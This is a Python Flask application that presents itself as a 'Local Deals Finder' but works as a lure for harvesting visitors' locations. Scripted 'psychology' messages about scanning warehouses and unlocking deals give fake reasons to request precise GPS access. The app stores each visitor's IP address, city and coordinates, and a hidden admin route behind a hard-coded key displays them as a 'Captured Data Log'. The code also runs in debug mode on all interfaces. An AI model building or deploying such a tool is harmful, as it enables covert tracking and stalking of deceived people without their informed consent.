"""
Local Deals Finder - Flask Application
Progressive geolocation detection with IP + GPS
"""

from flask import Flask, render_template, request, jsonify, redirect
import sqlite3
import os
from datetime import datetime
import requests

app = Flask(__name__)
app.secret_key = 'deals-finder-secret-key'

# Database setup
DB_PATH = os.path.join(os.path.dirname(__file__), 'location_data.db')

def init_db():
    """Initialize database with progressive location schema"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT,
            detected_city TEXT,
            region TEXT,
            country TEXT,
            gps_lat REAL,
            gps_lon REAL,
            gps_accuracy REAL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Progressive messages for psychology
PROGRESSIVE_MESSAGES = [
    'Scanning local warehouses in {area}...',
    'Checking last-mile delivery slots for your street...',
    'Unlocking exclusive deals for {area} shoppers...',
    'Verifying your precise location...'
]

@app.route('/')
def index():
    """Main page - shows welcome with IP-detected city"""
    # Get IP-based location
    try:
        response = requests.get('https://ipapi.co/json/', timeout=5)
        ip_data = response.json()
        city = ip_data.get('city', 'Local')
        region = ip_data.get('region', '')
        country = ip_data.get('country_name', '')
        ip = ip_data.get('ip', '')
    except:
        city, region, country, ip = 'Local', '', '', ''
    
    return render_template('index.html', 
                           city=city, 
                           region=region, 
                           country=country, 
                           ip=ip)

@app.route('/api/location', methods=['POST'])
def store_location():
    """Store location data with precision levels"""
    data = request.get_json()
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO user_locations 
        (ip_address, detected_city, region, country, gps_lat, gps_lon, gps_accuracy)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (
        data.get('ip_address'),
        data.get('detected_city'),
        data.get('region'),
        data.get('country'),
        data.get('gps_lat'),
        data.get('gps_lon'),
        data.get('gps_accuracy')
    ))
    conn.commit()
    conn.close()
    
    precision = 'HIGH' if data.get('gps_lat') else 'LOW'
    return jsonify({'message': 'Location stored', 'precision': precision})

@app.route('/api/stats')
def get_stats():
    """Get location statistics"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM user_locations')
    total = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_locations WHERE gps_lat IS NOT NULL')
    with_gps = cursor.fetchone()[0]
    conn.close()
    return jsonify({'total': total, 'with_gps': with_gps, 'ip_only': total - with_gps})

@app.route('/view_results_admin_<secret_key>')
def view_results(secret_key):
    MY_SECRET = "9988"  # This is your password
    
    if secret_key != MY_SECRET:
        return "404 Not Found", 404

    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM user_locations ORDER BY id DESC")
        rows = cursor.fetchall()
        conn.close()

        html = """
        <html><head><title>Admin Panel</title>
        <style>body{font-family:sans-serif; padding:20px;} table{width:100%; border-collapse:collapse;} 
        th,td{padding:8px; border:1px solid #333; text-align:left;} th{background:#eee;}</style>
        </head><body>
        <h2>Captured Data Log</h2>
        <table><tr><th>ID</th><th>IP</th><th>City</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Time</th></tr>
        """
        for row in rows:
            html += f"<tr><td>{row['id']}</td><td>{row['ip_address']}</td><td>{row['detected_city']}</td><td>{row['gps_lat']}</td><td>{row['gps_lon']}</td><td>{row['gps_accuracy']}</td><td>{row['created_at']}</td></tr>"
        
        return html + "</table></body></html>"
    except Exception as e:
        return f"Database Error: {e}"

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
